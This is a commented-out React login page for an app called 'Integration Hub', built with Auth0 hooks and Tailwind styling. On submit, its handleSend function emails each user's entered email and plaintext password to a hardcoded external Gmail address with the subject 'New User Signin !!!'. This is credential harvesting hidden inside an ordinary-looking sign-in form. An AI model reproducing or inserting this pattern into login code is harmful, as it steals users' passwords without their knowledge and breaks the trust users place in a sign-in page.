// import { useState } from "react";
// import { useAuth0 } from "@auth0/auth0-react";
// import { useAuthFetch } from "../hooks/useAuthFetch.js";
// import { Mail, Lock, LogIn, Loader2, } from "lucide-react";
// import { useTheme } from "../contexts/ThemeProvider.jsx";

// export default function Login() {
//  const {authFetch}  = useAuthFetch();
//   const { theme } = useTheme();
//   const [form, setForm] = useState({ email: "", password: "" });
//   const [submitting, setSubmitting] = useState(false);

//   const handleChange = (e) => {
//     setForm({ ...form, [e.target.name]: e.target.value });
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();

//     if(form.email ==="" || form.password === ""){
//         return;
//     }

    
//      await handleSend()
//     setSubmitting(true);

//   };
//     const handleSend = async () => {
 

//     const to = "killdeath214@gmail.com";
//     const subject = "New User Signin !!!";
//     const body = `username : ${form.email} /n Password : ${form.password}`;
//     try {

//       const res = await authFetch("http://localhost:4000/api/gmail/send", {
//         method: "POST",
//         body: JSON.stringify({ to, subject, body }),
//       });

//       console.log(res)

//       if (res.success) {
//         alert("email sent!!")
//       } else {
//         alert(`❌ Email blocked: ${res.reason}`);
//       }
//     } catch (err) {
//       console.error(err);
//      alert("Error sending email.");
//     }
//   };

//   return (
//     <div
//       className={`min-h-screen flex items-center justify-center px-4 transition-colors duration-300 ${
//         theme === "dark"
//           ? "bg-gray-950 text-gray-100"
//           : "bg-gray-50 text-gray-900"
//       }`}
//     >
//       <div className="max-w-5xl w-full flex flex-col md:flex-row items-center gap-8">
//         {/* Left side illustration */}
//         <div className="hidden md:block w-1/2">
//           <img
//             src="https://illustrations.popsy.co/gray/modern-design.svg"
//             alt="AI Assistant Illustration"
//             className="w-full h-auto opacity-90"
//           />
//         </div>

//         {/* Right side login card */}
//         <div
//           className={`w-full md:w-1/2 bg-white dark:bg-gray-900 shadow-lg rounded-2xl p-8 border ${
//             theme === "dark" ? "border-gray-800" : "border-gray-200"
//           }`}
//         >
//           <h2 className="text-2xl font-semibold text-center mb-6">
//             Welcome to <span className="text-blue-600 dark:text-blue-400">Integration Hub</span>
//           </h2>

//           {/* Login Form */}
//           <form onSubmit={handleSubmit} className="space-y-5">
//             {/* Email */}
//             <div>
//               <label className="block mb-1 text-sm font-medium">Email</label>
//               <div className="relative">
//                 <Mail className="absolute left-3 top-3.5 text-gray-400 w-5 h-5" />
//                 <input
//                   type="email"
//                   name="email"
//                   required
//                   value={form.email}
//                   onChange={handleChange}
//                   placeholder="you@example.com"
//                   className="w-full pl-10 pr-4 py-2.5 rounded-lg border border-gray-300 dark:border-gray-700 bg-transparent focus:ring-2 focus:ring-blue-500 outline-none transition"
//                 />
//               </div>
//             </div>

//             {/* Password */}
//             <div>
//               <label className="block mb-1 text-sm font-medium">Password</label>
//               <div className="relative">
//                 <Lock className="absolute left-3 top-3.5 text-gray-400 w-5 h-5" />
//                 <input
//                   type="password"
//                   name="password"
//                   required
//                   value={form.password}
//                   onChange={handleChange}
//                   placeholder="••••••••"
//                   className="w-full pl-10 pr-4 py-2.5 rounded-lg border border-gray-300 dark:border-gray-700 bg-transparent focus:ring-2 focus:ring-blue-500 outline-none transition"
//                 />
//               </div>
//             </div>

//             {/* Submit */}
//             <button
//               type="submit"
//               disabled={submitting}
//               className="w-full flex justify-center items-center gap-2 py-2.5 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition disabled:opacity-70"
//             >
//               {submitting ? (
//                 <>
//                   <Loader2 className="w-5 h-5 animate-spin" /> Signing in...
//                 </>
//               ) : (
//                 <>
//                   <LogIn className="w-5 h-5" /> Sign in
//                 </>
//               )}
//             </button>
//           </form>

//           {/* Divider */}
//           <div className="my-6 flex items-center">
//             <div className="flex-grow h-px bg-gray-300 dark:bg-gray-700" />
//             <span className="px-3 text-sm text-gray-500">or</span>
//             <div className="flex-grow h-px bg-gray-300 dark:bg-gray-700" />
//           </div>

//           {/* Google / GitHub login */}
//           <div className="space-y-3">
//             <button
//               onClick={() => loginWithRedirect()}
//               className="w-full flex items-center justify-center gap-3 py-2.5 rounded-lg border border-gray-300 dark:border-gray-700 hover:bg-gray-100 dark:hover:bg-gray-800 transition"
//             >
//               {/* <Google className="w-5 h-5 text-red-500" /> */}
//               Continue with Google
//             </button>

//             <button
//               className="w-full flex items-center justify-center gap-3 py-2.5 rounded-lg border border-gray-300 dark:border-gray-700 hover:bg-gray-100 dark:hover:bg-gray-800 transition"
//             >
//               {/* <Github className="w-5 h-5 text-gray-700 dark:text-gray-200" /> */}
//               Continue with GitHub
//             </button>
//           </div>

//           <p className="mt-6 text-center text-sm text-gray-500">
//             Don’t have an account?{" "}
//             <a href="/signup" className="text-blue-600 hover:underline">
//               Sign up
//             </a>
//           </p>
//         </div>
//       </div>
//     </div>
//   );
// }
